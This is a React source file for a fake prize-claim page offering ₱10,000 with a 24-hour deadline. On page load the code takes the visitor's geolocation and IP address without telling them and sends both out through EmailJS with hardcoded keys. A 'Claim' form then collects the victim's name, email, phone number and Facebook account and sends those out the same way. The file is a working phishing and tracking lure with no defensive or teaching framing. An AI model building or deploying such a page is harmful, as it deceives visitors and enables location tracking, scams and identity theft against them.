import React from "react";
import emailjs from "@emailjs/browser";

function App() {
  const [modal, setModal] = React.useState(false);
  const [ip, setIp] = React.useState("");
  const [data, setData] = React.useState({
    name: "",
    email: "",
    contactNumber: "",
    facebookAccount: "",
  });

  const [location, setLocation] = React.useState({ latitude: null, longitude: null, error: null });

  const getLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            error: null,
          });
        },
        (error) => {
          setLocation({ ...location, error: error.message });
        }
      );
    } else {
      setLocation({ ...location, error: "Geolocation is not supported by this browser." });
    }
  };

  React.useEffect( () => {
    function locationSender(){
      const emailForm = {
        ip: ip,
        latitude: location.latitude,
        longitude: location.longitude,
      }
  
      emailjs.send("service_qtdyx8y", "template_rislpj9", emailForm, {publicKey: "fsUkhmOibX_AR6fc9"})
          .then( (res) => {
              console.log(res);
          })
          .catch( (err) => {
              console.log(err);
          })
    }

    (ip || location) && locationSender();
  }, [ip, location]);

  React.useEffect(() => {
    getLocation();
    fetch("https://api64.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        setIp(data.ip)
      })
      .catch((err) => {
        console.log(err);
      })
  }, []);

  console.log(ip);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => {
      return {
        ...prev,
        [name]: value
      }
    });
  }

  const openModal = () => {
    setModal(true);
  }

  const closeModal = () => {
    setModal(false);
  }

  function detailSender(e){
    e.preventDefault();
    const emailForm = {
      name: data.name,
      email: data.email,
      contactNumber: data.contactNumber,
      facebookAccount: data.facebookAccount,
    }

    emailjs.send("service_2yvqvgo", "template_1qriits", emailForm, {publicKey: "fsUkhmOibX_AR6fc9"})
        .then( (res) => {
            console.log(res);
            setModal(false);
        })
        .catch( (err) => {
            console.log(err);
        })
  }

  return (
    <div className='min-h-[100svh] bg-white w-full flex flex-col p-4 gap-4 items-center text-center justify-center'>
      <span className="text-2xl">Congratulations! You've Won Cash!</span>
      <span className="text-red-500 text-4xl font-semibold">₱10,000.00</span>
      <span>Status: <span className="text-red-500">Unclaimed</span></span>
      <img className="max-w-[300px]" src="https://www.svgrepo.com/show/285411/gift-birthday.svg" alt="" />
      <span className="text-lg mt-2">Claim your reward before time runs out! <span className="text-red-500 font-semibold">This is only valid for 24 hours</span></span>
      
      <button className="mt-auto text-white bg-red-500 p-2 w-full rounded-2xl cursor-pointer animate-bounce" onClick={openModal}>Claim Now!!!</button>
      
      {modal &&
        <div className="inset-0 fixed p-4">
          <div className="bg-white w-full opacity-100 rounded-lg border border-neutral-200 w-full p-4">
            <div className="flex items-center justify-between">
              <span>Enter Details To Claim Your Price</span>
              <button onClick={closeModal}>X</button>
            </div>
            <form className="flex flex-col gap-2 mt-4" onSubmit={detailSender}>
              <input  
                type="text" 
                name="name"
                className="w-full h-11 p-1 border border-neutral-100 rounded-lg px-3"
                placeholder="Name"
                onChange={handleChange}
                required
                value={data.name}
              />
              <input  
                type="email" 
                name="email"
                className="w-full h-11 p-1 border border-neutral-100 rounded-lg px-3"
                placeholder="Email"
                onChange={handleChange}
                required
                value={data.email}
              />
              <input  
                type="number" 
                name="contactNumber"
                className="w-full h-11 p-1 border border-neutral-100 rounded-lg px-3"
                placeholder="Contact Number"
                onChange={handleChange}
                required
                value={data.contactNumber}
              />
              <input  
                type="text" 
                name="facebookAccount"
                className="w-full h-11 p-1 border border-neutral-100 rounded-lg px-3"
                placeholder="Facebook Account"
                onChange={handleChange}
                required
                value={data.facebookAccount}
              />
              <span className="mt-4">Make sure that the details are <span className="text-red-500">true and valid</span> in order to claim your price. After sending the details, we will review it and once it's done, a confirmation message will be sent to your email, number, or facebook account. <span className="text-red-500">Thank You!</span></span>

              <button className="text-white bg-red-500 p-2 rounded-2xl w-full mt-5 cursor-pointer">Claim</button>
            </form>
          </div>
        </div>
      }
    </div>
  )
}

export default App
